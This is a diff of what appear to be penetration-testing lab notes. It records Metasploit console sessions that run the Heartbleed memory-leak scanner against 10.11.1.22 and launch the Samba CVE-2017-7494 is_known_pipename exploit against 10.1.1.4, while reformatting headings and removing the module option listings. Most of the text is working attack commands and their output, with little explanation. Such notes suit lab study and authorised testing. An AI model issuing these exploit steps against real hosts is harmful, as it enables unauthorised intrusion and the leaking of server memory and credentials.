@@ -1,34 +1,11 @@
 
 
-HEARTBLEED
+*HEARTBLEED*
+-----
 
 msf > use auxiliary/scanner/ssl/openssl_heartbleed 
 msf auxiliary(openssl_heartbleed) > set RHOSTS 10.11.1.22
 RHOSTS => 10.11.1.22
-msf auxiliary(openssl_heartbleed) > show options
-
-Module options (auxiliary/scanner/ssl/openssl_heartbleed):
-
-   Name              Current Setting  Required  Description
-   ----              ---------------  --------  -----------
-   DUMPFILTER                         no        Pattern to filter leaked memory before storing
-   MAX_KEYTRIES      50               yes       Max tries to dump key
-   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
-   RHOSTS            10.11.1.22       yes       The target address range or CIDR identifier
-   RPORT             443              yes       The target port (TCP)
-   STATUS_EVERY      5                yes       How many retries until status
-   THREADS           1                yes       The number of concurrent threads
-   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)
-   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)
-
-
-Auxiliary action:
-
-   Name  Description
-   ----  -----------
-   SCAN  Check hosts for vulnerability
-
-
 msf auxiliary(openssl_heartbleed) > set VERBOSE TRUE
 VERBOSE => true
 msf auxiliary(openssl_heartbleed) > run
@@ -78,28 +55,11 @@ msf auxiliary(openssl_heartbleed) > run
 [*] Auxiliary module execution completed
 msf auxiliary(openssl_heartbleed) > 
 
-Samba CVE-2017-7494
+
+*SAMBA CVE-2017-7494*
+-----
 
 msf exploit(is_known_pipename) > use exploit/linux/samba/is_known_pipename 
-msf exploit(is_known_pipename) > show options
-
-Module options (exploit/linux/samba/is_known_pipename):
-
-   Name            Current Setting  Required  Description
-   ----            ---------------  --------  -----------
-   RHOST                            yes       The target address
-   RPORT           445              yes       The SMB service port (TCP)
-   SMB_FOLDER                       no        The directory to use within the writeable SMB share
-   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic (Interact)
-
-
 msf exploit(is_known_pipename) > set RHOST 10.1.1.4
 RHOST => 10.1.1.4
 msf exploit(is_known_pipename) > exploit 
